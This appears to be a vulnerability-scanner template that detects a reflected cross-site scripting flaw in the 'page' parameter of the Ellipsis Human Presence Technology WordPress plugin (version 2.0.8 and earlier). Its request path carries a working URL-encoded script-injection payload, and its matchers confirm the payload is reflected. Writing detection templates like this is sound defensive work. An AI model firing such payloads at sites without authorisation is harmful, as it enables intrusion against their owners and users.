id: "wp-ellipsis-xss"
name: "Ellipsis Human Presence Technology <= 2.0.8 - Cross Site Scripting"
severity: "medium"
description: "The 'page' GET parameter of the inc/protected-forms-table.php file was affected by a reflected XSS vulnerability."
tech:
  - "wordpress"
  - "php"
tags:
  - "wpscan"
  - "packetstorm"
  - "wordpress"
  - "wp-plugin"
  - "xss"
  - "vuln"
reference: "https://wpscan.com/vulnerability/c0a138d8-93ac-463c-b650-d849352c0b44"
spaExclusion: true
request:
  method: "GET"
  path: "/wp-content/plugins/ellipsis-human-presence-technology/inc/protected-forms-table.php?&page=%22%20%3E%3Cscript%3Ealert(document.location)%3C/script%3E"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "word"
    part: "body"
    words:
      - "<script>alert(document.location)</script>"
      - "<form id=\"protected-forms-table\""
    condition: "and"
  - type: "word"
    part: "header"
    words:
      - "text/html"
